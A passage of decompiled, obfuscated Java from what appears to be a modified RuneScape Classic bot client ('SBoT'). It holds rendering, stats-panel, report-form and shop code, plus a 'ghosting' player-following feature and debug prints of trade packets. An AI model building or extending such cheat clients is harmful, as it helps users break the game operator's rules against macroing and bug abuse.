                    aClass10_739.method269(efh.aClass5ArrayArray605[1][i]);
                    aClass10_739.method269(efh.aClass5ArrayArray603[1][i]);
                    aClass10_739.method269(efh.aClass5ArrayArray605[2][i]);
                    aClass10_739.method269(efh.aClass5ArrayArray603[2][i]);
                }
                aBoolean789 = false;
            }
        }

        if(anInt839 != anInt919)
        {
            anInt919 = anInt839;
            for(int j = 0; j < mobCount; j++)
            {
                if(mobtype[j] == 97)
                    method89(j, "firea" + (anInt839 + 1));
                if(mobtype[j] == 274)
                    method89(j, "fireplacea" + (anInt839 + 1));
                if(mobtype[j] == 1031)
                    method89(j, "lightning" + (anInt839 + 1));
                if(mobtype[j] == 1036)
                    method89(j, "firespell" + (anInt839 + 1));
                if(mobtype[j] == 1147)
                    method89(j, "spellcharge" + (anInt839 + 1));
            }

        }
        if(anInt840 != anInt920)
        {
            anInt920 = anInt840;
            for(int k = 0; k < mobCount; k++)
            {
                if(mobtype[k] == 51)
                    method89(k, "torcha" + (anInt840 + 1));
                if(mobtype[k] == 143)
                    method89(k, "skulltorcha" + (anInt840 + 1));
            }

        }
        if(anInt841 != anInt921)
        {
            anInt921 = anInt841;
            for(int l = 0; l < mobCount; l++)
                if(mobtype[l] == 1142)
                    method89(l, "clawspell" + (anInt841 + 1));

        }
        aClass10_739.method273(anInt744);
        anInt744 = 0;
        for(int i1 = 0; i1 < playerCount; i1++)
        {
            Class2 class2 = player[i1];
            if(class2.anInt171 != 255)
            {
                int k1 = class2.x;
                int i2 = class2.y;
                int k2 = -efh.method421(k1, i2);
                int l3 = aClass10_739.method274(5000 + i1, k1, k2, i2, 145, 220, i1 + 10000);
                anInt744++;
                if(class2 == myplayer)
                    aClass10_739.method275(l3);
                if(class2.hah == 8)
                    aClass10_739.method276(l3, -30);
                if(class2.hah == 9)
                    aClass10_739.method276(l3, 30);
            }
        }

        for(int j1 = 0; j1 < playerCount; j1++)
        {
            Class2 class2_1 = player[j1];
           if(class2_1.anInt176 > 0)
            {
                Class2 class2_2 = null;
                if(class2_1.anInt175 != -1)
                    class2_2 = aClass2Array957[class2_1.anInt175];
                else
                if(class2_1.anInt174 != -1)
                    class2_2 = aClass2Array891[class2_1.anInt174];
                if(class2_2 != null)
                {
                    int l2 = class2_1.x;
                    int i4 = class2_1.y;
                    int l6 = -efh.method421(l2, i4) - 110;
                    int l8 = class2_2.x;
                    int k9 = class2_2.y;
                    int l9 = -efh.method421(l8, k9) - identify.anIntArray103[class2_2.type] / 2;
                    int i10 = (l2 * class2_1.anInt176 + l8 * (anInt897 - class2_1.anInt176)) / anInt897;
                    int j10 = (l6 * class2_1.anInt176 + l9 * (anInt897 - class2_1.anInt176)) / anInt897;
                    int k10 = (i4 * class2_1.anInt176 + k9 * (anInt897 - class2_1.anInt176)) / anInt897;
                    aClass10_739.method274(anInt951 + class2_1.anInt173, i10, j10, k10, 32, 32, 0);
                    anInt744++;
                }
            }
        }

        for(int l1 = 0; l1 < npcCount; l1++)
        {
            Class2 class2_3 = npc[l1];
            int i3 = class2_3.x;
            int j4 = class2_3.y;
            int i7 = -efh.method421(i3, j4);
            int i9 = aClass10_739.method274(20000 + l1, i3, i7, j4, identify.anIntArray102[class2_3.type], identify.anIntArray103[class2_3.type], l1 + 30000);
            anInt744++;
            if(class2_3.hah == 8)
                aClass10_739.method276(i9, -30);
            if(class2_3.hah == 9)
                aClass10_739.method276(i9, 30);
        }

        for(int j2 = 0; j2 < itemCount; j2++)
        {
            int j3 = itemx[j2] * absnpc + 64;
            int k4 = itemy[j2] * absnpc + 64;
            aClass10_739.method274(40000 + itemtype[j2], j3, -efh.method421(j3, k4) - anIntArray773[j2], k4, 96, 64, j2 + 20000);
            anInt744++;
        }

        for(int k3 = 0; k3 < anInt833; k3++)
        {
            int l4 = anIntArray881[k3] * absnpc + 64;
            int j7 = anIntArray934[k3] * absnpc + 64;
            int j9 = anIntArray730[k3];
            if(j9 == 0)
            {
                aClass10_739.method274(50000 + k3, l4, -efh.method421(l4, j7), j7, 128, 256, k3 + 50000);
                anInt744++;
            }
            if(j9 == 1)
            {
                aClass10_739.method274(50000 + k3, l4, -efh.method421(l4, j7), j7, 128, 64, k3 + 50000);
                anInt744++;
            }
        }

        gfx.aBoolean335 = false;
        gfx.method212();
        gfx.aBoolean335 = super.aBoolean39;
        if(dhd == 3)
        {
            int i5 = 40 + (int)(Math.random() * 3D);
            int k7 = 40 + (int)(Math.random() * 7D);
            aClass10_739.method310(i5, k7, -50, -10, -50);
        }
        anInt958 = 0;
        anInt820 = 0;
        anInt766 = 0;
        if(aBoolean757)
        {
            if(aBoolean675 && !aBoolean789)
            {
                int j5 = anInt940;
                method78();
                if(anInt940 != j5)
                {
                    anInt714 = myplayer.x;
                    anInt715 = myplayer.y;
                }
            }
            aClass10_739.anInt390 = 4100;
            aClass10_739.anInt391 = 4100;
            aClass10_739.anInt392 = 1;
            aClass10_739.anInt393 = 4100;
           anInt729 = anInt940 * 32;
            int k5 = anInt714 + anInt895;
            int l7 = anInt715 + anInt973;
            aClass10_739.method298(k5, -efh.method421(k5, l7), l7, yrot, anInt729 * 4, 0, 2000);
        } else
        {
            if(aBoolean675 && !aBoolean789)
                method78();
            if(!super.aBoolean39)
            {
              aClass10_739.anInt390 = 41000;
                aClass10_739.anInt391 = 41000;
                aClass10_739.anInt392 = 1;
                aClass10_739.anInt393 = 40000;
            } else
            {
                aClass10_739.anInt390 = 41000;
                aClass10_739.anInt391 = 41000;
                aClass10_739.anInt392 = 1;
                aClass10_739.anInt393 = 41000;
            }
            int l5 = ghostingPlayerX() + anInt895;
            int i8 = ghostingPlayerY() + anInt973;
            aClass10_739.method298(l5, -efh.method421(l5, i8), i8, yrot, anInt729 * 4, 0, anInt683 * 2);
        }
        aClass10_739.method286();
        method101();
        if(ehd > 0)
            gfx.method231(anInt671 - 8, anInt672 - 8, anInt948 + 14 + (24 - ehd) / 6);
        if(ehd < 0)
            gfx.method231(anInt671 - 8, anInt672 - 8, anInt948 + 18 + (24 + ehd) / 6);
		
		if (ghosting != null)
		{
			if(super.anInt34 >= anInt677 - 15 && anInt813 != 0)
			{
				ghosting = null;
				DisplayMessage("@gre@SBoT: @whi@Ghosting disabled!", 3);
				anInt813 = 0;
			}
		}
		if (ghosting != null)
		{
			gfx.drawString("Ghosting " + ghosting + "! [cancel]", 256, anInt677 - 7, 1, 0xffff00);
		}

        if(anInt749 != 0)
        {
            int i6 = anInt749 / 50;
            int j8 = i6 / 60;
            i6 %= 60;
            if(i6 < 10)
                gfx.drawString("System update in: " + j8 + ":0" + i6, 256, anInt677 - 7, 1, 0xffff00);
            else
                gfx.drawString("System update in: " + j8 + ":" + i6, 256, anInt677 - 7, 1, 0xffff00);
        }
if (penis)
{
gfx.drawString("@dre@You id: @ora@" + myplayer.id, 390, 320, 1, 0);
} else {
gfx.drawString("@dre@Your id: @ora@" + myplayer.id, 420, 300, 1, 0);
gfx.drawString("@ora@There are@dre@ " + playerCount + " @ora@people around your area!", 385, 310, 1, 0);
gfx.drawString("@ora@There are@dre@ " + npcCount + " @ora@NPC around your area!", 390, 320, 1, 0);
}
if(!dih)
        {
            int j6 = 2203 - (smally + dhb + bigy);
            if(smallx + dha + bigx >= 2640)
                j6 = -50;
            if(j6 > 0)
            {
                int k8 = 1 + j6 / 6;
                gfx.method231(453, anInt677 - 56, anInt948 + 13);
                gfx.drawString("Wilderness", 465, anInt677 - 20, 1, 0xffff00);
                gfx.drawString("Level: " + k8, 465, anInt677 - 7, 1, 0xffff00);
                if(anInt725 == 0)
                    anInt725 = 2;
            }
            if(anInt725 == 0 && j6 > -10 && j6 <= 0)
                anInt725 = 1;
        }
        if(anInt780 == 0)
        {
            for(int k6 = 0; k6 < 5; k6++)
                if(anIntArray935[k6] > 0)
                {
                    String s = aStringArray774[k6];
                    gfx.method257(s, 7, anInt677 - 18 - k6 * 12, 1, 0xffff00);
                }

        }

        aClass4_775.method172(anInt776);
        aClass4_775.method172(anInt778);
        aClass4_775.method172(anInt779);
        if(anInt780 == 1)
            aClass4_775.method171(anInt776);
        else
        if(anInt780 == 2)
            aClass4_775.method171(anInt778);
        else
        if(anInt780 == 3)
            aClass4_775.method171(anInt779);
        Class4.anInt225 = 2;
        aClass4_775.method142();
        Class4.anInt225 = 0;
        gfx.method233(((Class6) (gfx)).anInt311 - 3 - 197, 3, anInt948, 128);
        method65();
        gfx.aBoolean338 = false;
        method69();
        gfx.method211(aGraphics857, 0, 0);
    }

    final void method109(int i, int j, int k, int l, int i1, int j1, int k1)
    {
        int l1 = anIntArray730[i1];
        int i2 = anIntArray972[i1];
        if(l1 == 0)
        {
            int j2 = 255 + i2 * 5 * 256;
            gfx.method213(i + k / 2, j + l / 2, 20 + i2 * 2, j2, 255 - i2 * 5);
        }
        if(l1 == 1)
        {
            int k2 = 0xff0000 + i2 * 5 * 256;
            gfx.method213(i + k / 2, j + l / 2, 10 + i2, k2, 255 - i2 * 5);
        }
    }

    protected final void method11(int i, int j, int k)
    {
    }

    public final void method110()
    {
        int l1 = identify.anInt144;
        if(anInt813 != 0)
        {
            for(int i = 0; i < listcount; i++)
            {
                int k = anInt752 + 2;
                int i1 = anInt753 + 27 + i * 15;
                if(super.anInt33 <= k - 2 || super.anInt34 <= i1 - 12 || super.anInt34 >= i1 + 4 || super.anInt33 >= (k - 3) + anInt754)
                    continue;
                fem(anIntArray984[i]);
                break;
            }

            anInt813 = 0;
            aBoolean854 = false;
            return;
        }
        if(super.anInt33 < anInt752 - 10 || super.anInt34 < anInt753 - 10 || super.anInt33 > anInt752 + anInt754 + 10 || super.anInt34 > anInt753 + anInt755 + 10)
        {
            aBoolean854 = false;
            return;
        }
        gfx.method214(anInt752, anInt753, anInt754, anInt755, 0xd0d0d0, 160);
        gfx.method257("Choose option", anInt752 + 2, anInt753 + 12, 1, 65535);
        for(int j = 0; j < listcount; j++)
        {
            int l = anInt752 + 2;
            int j1 = anInt753 + 27 + j * 15;
            int k1 = 0xffffff;
            if(super.anInt33 > l - 2 && super.anInt34 > j1 - 12 && super.anInt34 < j1 + 4 && super.anInt33 < (l - 3) + anInt754)
                k1 = 0xffff00;
            gfx.method257(firstmsg[anIntArray984[j]] + " " + secondmsg[anIntArray984[j]], l, j1, 1, k1);
        }

    }

    public final void fef(int i, int j, int k)
    {
        if(k == 0)
        {
            method83(smallx, smally, i, j - 1, i, j, false, true);
            return;
        }
        if(k == 1)
        {
            method83(smallx, smally, i - 1, j, i, j, false, true);
            return;
        } else
        {
            method83(smallx, smally, i, j, i, j, true, true);
            return;
        }
    }

    public final boolean method112(int i)
    {
        int j = myplayer.x / 128;
        int k = myplayer.y / 128;
        for(int l = 2; l >= 1; l--)
        {
            if(i == 1 && ((efh.anIntArrayArray608[j][k - l] & 0x80) == 128 || (efh.anIntArrayArray608[j - l][k] & 0x80) == 128 || (efh.anIntArrayArray608[j - l][k - l] & 0x80) == 128))
                return false;
            if(i == 3 && ((efh.anIntArrayArray608[j][k + l] & 0x80) == 128 || (efh.anIntArrayArray608[j - l][k] & 0x80) == 128 || (efh.anIntArrayArray608[j - l][k + l] & 0x80) == 128))
                return false;
            if(i == 5 && ((efh.anIntArrayArray608[j][k + l] & 0x80) == 128 || (efh.anIntArrayArray608[j + l][k] & 0x80) == 128 || (efh.anIntArrayArray608[j + l][k + l] & 0x80) == 128))
                return false;
            if(i == 7 && ((efh.anIntArrayArray608[j][k - l] & 0x80) == 128 || (efh.anIntArrayArray608[j + l][k] & 0x80) == 128 || (efh.anIntArrayArray608[j + l][k - l] & 0x80) == 128))
                return false;
            if(i == 0 && (efh.anIntArrayArray608[j][k - l] & 0x80) == 128)
                return false;
            if(i == 2 && (efh.anIntArrayArray608[j - l][k] & 0x80) == 128)
                return false;
            if(i == 4 && (efh.anIntArrayArray608[j][k + l] & 0x80) == 128)
                return false;
            if(i == 6 && (efh.anIntArrayArray608[j + l][k] & 0x80) == 128)
                return false;
        }

        return true;
    }

    public final void method113()
    {
        int i1 = identify.anInt144;
        byte abyte0[] = method18("textures" + Class18.anInt578 + ".jag", "Textures", 50);
        if(abyte0 == null)
        {
            aBoolean922 = true;
            return;
        }
        byte abyte1[] = fnf.method366("index.dat", 0, abyte0);
        aClass10_739.method303(identify.anInt61, 7, 11);
        for(int i = 0; i < identify.anInt61; i++)
        {
            String s = identify.aStringArray67[i];
            byte abyte2[] = fnf.method366(s + ".dat", 0, abyte0);
            gfx.method225(anInt952, abyte2, abyte1, 1);
            gfx.method216(0, 0, 128, 128, 0xff00ff);
            gfx.method231(0, 0, anInt952);
            int j = ((Class6) (gfx)).anIntArray328[anInt952];
            String s1 = identify.aStringArray68[i];
            if(s1 != null && s1.length() > 0)
            {
                byte abyte3[] = fnf.method366(s1 + ".dat", 0, abyte0);
                gfx.method225(anInt952, abyte3, abyte1, 1);
                gfx.method231(0, 0, anInt952);
            }
            gfx.method230(anInt953 + i, 0, 0, j, j);
            int k = j * j;
            for(int l = 0; l < k; l++)
                if(((Class6) (gfx)).anIntArrayArray321[anInt953 + i][l] == 65280)
                    ((Class6) (gfx)).anIntArrayArray321[anInt953 + i][l] = 0xff00ff;

            gfx.method227(anInt953 + i);
            aClass10_739.method304(i, ((Class6) (gfx)).aByteArrayArray322[anInt953 + i], ((Class6) (gfx)).anIntArrayArray323[anInt953 + i], j / 64 - 1);
        }

    }

    public final void method114()
    {
        if(selectedmenu == 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 && super.anInt34 < 35)
            selectedmenu = 1;
        if(selectedmenu == 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 33 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 33 && super.anInt34 < 35)
        {
            selectedmenu = 2;
            anInt859 = (int)(Math.random() * 13D) - 6;
            anInt860 = (int)(Math.random() * 23D) - 11;
        }
        if(selectedmenu == 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 66 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 66 && super.anInt34 < 35)
            selectedmenu = 3;
        if(selectedmenu == 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 99 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 99 && super.anInt34 < 35)
            selectedmenu = 4;
        if(selectedmenu == 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 132 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 132 && super.anInt34 < 35)
            selectedmenu = 5;
        if(selectedmenu == 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 165 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 165 && super.anInt34 < 35)
            selectedmenu = 6;
        if(selectedmenu != 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 && super.anInt34 < 26)
            selectedmenu = 1;
        if(selectedmenu != 0 && selectedmenu != 2 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 33 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 33 && super.anInt34 < 26)
        {
            selectedmenu = 2;
            anInt859 = (int)(Math.random() * 13D) - 6;
            anInt860 = (int)(Math.random() * 23D) - 11;
        }
        if(selectedmenu != 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 66 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 66 && super.anInt34 < 26)
            selectedmenu = 3;
        if(selectedmenu != 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 99 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 99 && super.anInt34 < 26)
            selectedmenu = 4;
        if(selectedmenu != 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 132 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 132 && super.anInt34 < 26)
            selectedmenu = 5;
        if(selectedmenu != 0 && super.anInt33 >= ((Class6) (gfx)).anInt311 - 35 - 165 && super.anInt34 >= 3 && super.anInt33 < ((Class6) (gfx)).anInt311 - 3 - 165 && super.anInt34 < 26)
            selectedmenu = 6;
        if(selectedmenu == 1 && (super.anInt33 < ((Class6) (gfx)).anInt311 - 248 || super.anInt34 > 36 + (anInt707 / 5) * 34))
            selectedmenu = 0;
        if(selectedmenu == 3 && (super.anInt33 < ((Class6) (gfx)).anInt311 - 199 || super.anInt34 > 316))
            selectedmenu = 0;
        if((selectedmenu == 2 || selectedmenu == 4 || selectedmenu == 5) && (super.anInt33 < ((Class6) (gfx)).anInt311 - 199 || super.anInt34 > 240))
            selectedmenu = 0;
        if(selectedmenu == 6 && (super.anInt33 < ((Class6) (gfx)).anInt311 - 199 || super.anInt34 > 311))
            selectedmenu = 0;
    }

    public final void method115(boolean flag)
    {
        int k3 = identify.anInt144;
        int i = ((Class6) (gfx)).anInt311 - 199;
        int j = 36;
        gfx.method231(i - 49, 3, anInt948 + 3);
        char c = '\304';
        char c1 = '\u0113';
        int l;
        int k = l = Class6.method223(160, 160, 160);
        if(anInt828 == 0)
            k = Class6.method223(220, 220, 220);
        else
            l = Class6.method223(220, 220, 220);
        gfx.method214(i, j, c / 2, 24, k, 128);
        gfx.method214(i + c / 2, j, c / 2, 24, l, 128);
        gfx.method214(i, j + 24, c, c1 - 24, Class6.method223(220, 220, 220), 128);
        gfx.method218(i, j + 24, c, 0);
        gfx.method219(i + c / 2, j, 24, 0);
        gfx.drawString("Stats", i + c / 4, j + 16, 4, 0);
        gfx.drawString("Quests", i + c / 4 + c / 2, j + 16, 4, 0);
        if(anInt828 == 0)
        {
            int i1 = 72;
            int k1 = -1;
            gfx.method257("Skills", i + 5, i1, 3, 0xffff00);
            i1 += 13;
            for(int l1 = 0; l1 < 9; l1++)
            {
                int i2 = 0xffffff;
                if(super.anInt33 > i + 3 && super.anInt34 >= i1 - 11 && super.anInt34 < i1 + 2 && super.anInt33 < i + 90)
                {
                    i2 = 0xff0000;
                    k1 = l1;
                }
                gfx.method257(curstatname[l1] + ":@yel@" + curstat[l1] + "/" + stat[l1], i + 5, i1, 1, i2);
                i2 = 0xffffff;
                if(super.anInt33 >= i + 90 && super.anInt34 >= i1 - 13 - 11 && super.anInt34 < (i1 - 13) + 2 && super.anInt33 < i + 196)
                {
                    i2 = 0xff0000;
                    k1 = l1 + 9;
                }
                gfx.method257(curstatname[l1 + 9] + ":@yel@" + curstat[l1 + 9] + "/" + stat[l1 + 9], (i + c / 2) - 5, i1 - 13, 1, i2);
                i1 += 13;
            }

            gfx.method257("Quest Points:@yel@" + anInt996, (i + c / 2) - 5, i1 - 13, 1, 0xffffff);
            i1 += 12;
            gfx.method257("Fatigue: @yel@" + (fatigue * 100) / 750 + "%", i + 5, i1 - 13, 1, 0xffffff);
            i1 += 8;
            gfx.method257("Equipment Status", i + 5, i1, 3, 0xffff00);
            i1 += 12;
            for(int j2 = 0; j2 < 3; j2++)
            {
                gfx.method257(aStringArray932[j2] + ":@yel@" + anIntArray797[j2], i + 5, i1, 1, 0xffffff);
                if(j2 < 2)
                    gfx.method257(aStringArray932[j2 + 3] + ":@yel@" + anIntArray797[j2 + 3], i + c / 2 + 25, i1, 1, 0xffffff);
                i1 += 13;
            }

            i1 += 6;
            gfx.method218(i, i1 - 15, c, 0);
            if(k1 != -1)
            {
                gfx.method257(aStringArray795[k1] + " skill", i + 5, i1, 1, 0xffff00);
                i1 += 12;
                int k2 = anIntArray686[0];
                for(int i3 = 0; i3 < 98; i3++)
                    if(anIntArray712[k1] >= anIntArray686[i3])
                        k2 = anIntArray686[i3 + 1];

                gfx.method257("Total xp: " + anIntArray712[k1] / 4, i + 5, i1, 1, 0xffffff);
                i1 += 12;
                gfx.method257("Next level at: " + k2 / 4, i + 5, i1, 1, 0xffffff);
            } else
            {
                gfx.method257("Overall levels", i + 5, i1, 1, 0xffff00);
                i1 += 12;
                int l2 = 0;
                for(int j3 = 0; j3 < 18; j3++)
                    l2 += stat[j3];

                gfx.method257("Skill total: " + l2, i + 5, i1, 1, 0xffffff);
                i1 += 12;
                gfx.method257("Combat level: " + myplayer.level, i + 5, i1, 1, 0xffffff);
                i1 += 12;
            }
        }
        if(anInt828 == 1)
        {
            aClass4_826.method165(anInt827);
            aClass4_826.method167(anInt827, 0, "@whi@Quest-list (green=completed)");
            for(int j1 = 0; j1 < 50; j1++)
                aClass4_826.method167(anInt827, j1 + 1, (aBooleanArray716[j1] ? "@gre@" : "@red@") + aStringArray930[j1]);

            aClass4_826.method142();
        }
        if(!flag)
            return;
        i = super.anInt33 - (((Class6) (gfx)).anInt311 - 199);
        j = super.anInt34 - 36;
        if(i >= 0 && j >= 0 && i < c && j < c1)
        {
            if(anInt828 == 1)
                aClass4_826.method139(i + (((Class6) (gfx)).anInt311 - 199), j + 36, super.anInt36, super.anInt35);
            if(j <= 24 && anInt813 == 1)
            {
                if(i < 98)
                {
                    anInt828 = 0;
                    return;
                }
                if(i > 98)
                    anInt828 = 1;
            }
        }
    }

    public final void method116()
    {
        int l = identify.anInt144;
        anInt863 = 0;
        int i = 135;
        for(int j = 0; j < 12; j++)
        {
            if(super.anInt33 > 66 && super.anInt33 < 446 && super.anInt34 >= i - 12 && super.anInt34 < i + 3)
                anInt863 = j + 1;
            i += 14;
        }

        if(anInt813 != 0 && anInt863 != 0)
        {
            anInt813 = 0;
            anInt986 = 2;
            super.fln = "";
            super.fma = "";
            return;
        }
        i += 15;
        if(anInt813 != 0)
        {
            anInt813 = 0;
            if(super.anInt33 < 56 || super.anInt34 < 35 || super.anInt33 > 456 || super.anInt34 > 325)
            {
                anInt986 = 0;
                return;
            }
            if(super.anInt33 > 66 && super.anInt33 < 446 && super.anInt34 >= i - 15 && super.anInt34 < i + 5)
            {
                anInt986 = 0;
                return;
            }
        }
        gfx.method216(56, 35, 400, 290, 0);
        gfx.method217(56, 35, 400, 290, 0xffffff);
        i = 50;
        gfx.drawString("This form is for reporting players who are breaking our rules", 256, i, 1, 0xffffff);
        i += 15;
        gfx.drawString("Using it sends a snapshot of the last 60 secs of activity to us", 256, i, 1, 0xffffff);
        i += 15;
        gfx.drawString("If you misuse this form, you will be banned.", 256, i, 1, 0xff8000);
        i += 15;
        i += 10;
        gfx.drawString("First indicate which of our 12 rules is being broken. For a detailed", 256, i, 1, 0xffff00);
        i += 15;
        gfx.drawString("explanation of each rule please read the manual on our website.", 256, i, 1, 0xffff00);
        i += 15;
        int k;
        if(anInt863 == 1)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("1: Offensive language", 256, i, 1, k);
        i += 14;
        if(anInt863 == 2)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("2: Item scamming", 256, i, 1, k);
        i += 14;
        if(anInt863 == 3)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("3: Password scamming", 256, i, 1, k);
        i += 14;
        if(anInt863 == 4)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("4: Bug abuse", 256, i, 1, k);
        i += 14;
        if(anInt863 == 5)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("5: Jagex Staff impersonation", 256, i, 1, k);
        i += 14;
        if(anInt863 == 6)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("6: Account sharing/trading", 256, i, 1, k);
        i += 14;
        if(anInt863 == 7)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("7: Macroing", 256, i, 1, k);
        i += 14;
        if(anInt863 == 8)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("8: Mutiple logging in", 256, i, 1, k);
        i += 14;
        if(anInt863 == 9)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("9: Encouraging others to break rules", 256, i, 1, k);
        i += 14;
        if(anInt863 == 10)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("10: Misuse of customer support", 256, i, 1, k);
        i += 14;
        if(anInt863 == 11)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("11: Advertising / website", 256, i, 1, k);
        i += 14;
        if(anInt863 == 12)
        {
            gfx.method217(66, i - 12, 380, 15, 0xffffff);
            k = 0xff8000;
        } else
        {
            k = 0xffffff;
        }
        gfx.drawString("12: Real world item trading", 256, i, 1, k);
        i += 14;
        i += 15;
        k = 0xffffff;
        if(super.anInt33 > 196 && super.anInt33 < 316 && super.anInt34 > i - 15 && super.anInt34 < i + 5)
            k = 0xffff00;
        gfx.drawString("Click here to cancel", 256, i, 1, k);
    }

    public final void method117()
    {
        int l6 = identify.anInt144;
        if(anInt813 != 0)
        {
            anInt813 = 0;
            int i = super.anInt33 - 52;
            int j = super.anInt34 - 44;
            if(i >= 0 && j >= 12 && i < 408 && j < 246)
            {
                int k = 0;
                for(int i1 = 0; i1 < 5; i1++)
                {
                    for(int i2 = 0; i2 < 8; i2++)
                    {
                        int l2 = 7 + i2 * 49;
                        int l3 = 28 + i1 * 34;
                        if(i > l2 && i < l2 + 49 && j > l3 && j < l3 + 34 && ebd[k] != -1)
                        {
                            ddh = k;
                            anInt904 = ebd[k];
                        }
                        k++;
                    }

                }

                if(ddh >= 0)
                {
                    int j2 = ebd[ddh];
                    if(j2 != -1)
                    {
                        if(ebe[ddh] > 0 && i > 298 && j >= 204 && i < 408 && j <= 215)
                        {
                            int i3 = dei + ebf[ddh];
                            if(i3 < 10)
                                i3 = 10;
                            int i4 = (i3 * identify.ahk[j2]) / 100;
							System.out.println("Buy(" + ebd[ddh] + ");");
                            super.packets.id(67);
                            super.packets.cmd(ebd[ddh]);
                            super.packets.hfb(i4);
                            super.packets.send();
                        }
                        if(InvCount(j2) > 0 && i > 2 && j >= 229 && i < 112 && j <= 240)
                        {
                            int j3 = deh + ebf[ddh];
                            if(j3 < 10)
                                j3 = 10;
                            int j4 = (j3 * identify.ahk[j2]) / 100;
							System.out.println("Sell(" + ebd[ddh] + ");");
                            super.packets.id(177);
                            super.packets.cmd(ebd[ddh]);
                            super.packets.hfb(j4);
                            super.packets.send();
                        }
                    }
                }
            } else
            {
                super.packets.id(92);
                super.packets.send();
                shop = false;
                return;
            }
        }
        byte byte0 = 52;
        byte byte1 = 44;
        gfx.method216(byte0, byte1, 408, 12, 192);
        int l = 0x989898;
        gfx.method214(byte0, byte1 + 12, 408, 17, l, 160);
        gfx.method214(byte0, byte1 + 29, 8, 170, l, 160);
        gfx.method214(byte0 + 399, byte1 + 29, 9, 170, l, 160);
        gfx.method214(byte0, byte1 + 199, 408, 47, l, 160);
        gfx.method257("Buying and selling items", byte0 + 1, byte1 + 10, 1, 0xffffff);
        int j1 = 0xffffff;
        if(super.anInt33 > byte0 + 320 && super.anInt34 >= byte1 && super.anInt33 < byte0 + 408 && super.anInt34 < byte1 + 12)
            j1 = 0xff0000;
        gfx.method254("Close window", byte0 + 406, byte1 + 10, 1, j1);
        gfx.method257("Shops stock in green", byte0 + 2, byte1 + 24, 1, 65280);
        gfx.method257("Number you own in blue", byte0 + 135, byte1 + 24, 1, 65535);
        gfx.method257("Your money: " + InvCount(10) + "gp", byte0 + 280, byte1 + 24, 1, 0xffff00);
        int k2 = 0xd0d0d0;
        int k3 = 0;
        for(int k4 = 0; k4 < 5; k4++)
        {
            for(int l4 = 0; l4 < 8; l4++)
            {
                int j5 = byte0 + 7 + l4 * 49;
                int i6 = byte1 + 28 + k4 * 34;
                if(ddh == k3)
                    gfx.method214(j5, i6, 49, 34, 0xff0000, 160);
                else
                    gfx.method214(j5, i6, 49, 34, k2, 160);
                gfx.method217(j5, i6, 50, 35, 0);
                if(ebd[k3] != -1)
                {
                    gfx.method247(j5, i6, 48, 32, anInt950 + identify.anIntArray53[ebd[k3]], identify.anIntArray58[ebd[k3]], 0, 0, false);
                    gfx.method257(String.valueOf(ebe[k3]), j5 + 1, i6 + 10, 1, 65280);
                    gfx.method254(String.valueOf(InvCount(ebd[k3])), j5 + 47, i6 + 10, 1, 65535);
                }
                k3++;
            }

        }

        gfx.method218(byte0 + 5, byte1 + 222, 398, 0);
        if(ddh == -1)
        {
            gfx.drawString("Select an object to buy or sell", byte0 + 204, byte1 + 214, 3, 0xffff00);
            return;
        }
        int i5 = ebd[ddh];
        if(i5 != -1)
        {
            if(ebe[ddh] > 0)
            {
                int k5 = dei + ebf[ddh];
                if(k5 < 10)
                    k5 = 10;
                int j6 = (k5 * identify.ahk[i5]) / 100;
                gfx.method257("Buy a new " + identify.itemName[i5] + " for " + j6 + "gp", byte0 + 2, byte1 + 214, 1, 0xffff00);
                int k1 = 0xffffff;
